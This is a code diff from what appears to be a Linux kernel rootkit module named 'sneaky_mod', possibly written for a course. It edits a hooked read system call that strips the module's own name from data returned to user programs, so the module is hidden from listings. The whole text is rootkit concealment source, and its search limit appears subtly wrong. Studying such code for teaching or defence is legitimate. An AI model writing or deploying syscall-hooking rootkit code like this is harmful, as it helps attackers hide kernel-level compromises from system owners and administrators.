@@ -121,24 +121,28 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
 asmlinkage int (*original_read)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
-  void * originial_buffer = (void *) regs->si;
+  ssize_t nread;
+  char *find_sneaky, *find_end;
+  ssize_t sneaky_len;
+  void * original_buffer = (void *) regs->si;
+
   // call original read and get the original data
-  ssize_t nread = original_read(regs);
+  nread = original_read(regs);
   if (nread <= 0) {
     return nread;
   }
   
   // first find sneaky process
   // void * find_sneaky = strnstr(originial_buffer, "sneaky_mod", nread);
-  void * find_sneaky = strnstr(originial_buffer, "sneaky_mod", strlen("sneaky_mod"));
+  find_sneaky = strnstr(original_buffer, "sneaky_mod", strlen("sneaky_mod"));
   if (find_sneaky) {
     // then find the \n after it 
-    void * find_end = strnstr(find_sneaky, "\n", nread - find_sneaky + originial_buffer);
+    find_end = strnstr(find_sneaky, "\n", nread - find_sneaky + (char *)original_buffer);
     // delete the sneaky process
     if (find_end) {
       // calculate the next after sneakly len with \n
-      ssize_t sneaky_len = find_end - find_sneaky + 1;
-      memmove(find_sneaky, find_end + 1, nread - find_sneaky + originial_buffer - sneaky_len);
+      sneaky_len = find_end - find_sneaky + 1;
+      memmove(find_sneaky, find_end + 1, nread - find_sneaky + (char *)original_buffer - sneaky_len);
       // edit the total length
       nread -= sneaky_len;
     }
